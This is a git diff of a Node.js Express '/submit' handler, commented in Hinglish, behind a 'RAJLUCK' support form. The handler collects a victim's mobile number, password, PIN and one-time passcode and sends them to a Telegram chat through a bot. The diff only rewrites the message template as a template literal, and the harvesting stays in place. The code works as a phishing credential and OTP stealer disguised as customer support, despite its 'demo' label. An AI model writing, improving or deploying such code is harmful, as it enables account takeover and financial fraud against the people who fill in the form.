@@ -28,17 +28,13 @@ app.post("/submit", async (req, res) => {
                 message: "Kripya mobile number aur OTP dono enter karein."
             });
         }
-
-        // Telegram par bheje jaane wale message ka format
-        const messageText = `
-,🔴 RAJLUCK NOTIFICATION\n\n
-,📌 Support Issue: ` + issue + `\n` +
- ,📱 Mobile Number: ` + phone + `\n` +
-,🔒 Password: ` + password + `\n` +
- ,🆔 Pin: ` + pin + `\n` +
- ,💬 Received OTP: ` + otp + `\n\n` +
- ,Demo support information received.`;
-
+        const messageText = `RAJLUCK NOTIFICATION
+📌 Support Issue: ${issue}
+📱 Mobile Number: ${phone}
+🔑 Password: ${password}
+🆔 Pin: ${pin}
+📨 Received OTP: ${otp}
+Demo support information received.`;
         // Telegram bot ke zariye chat mein message send karna
         await bot.sendMessage(process.env.CHAT_ID, messageText);
 
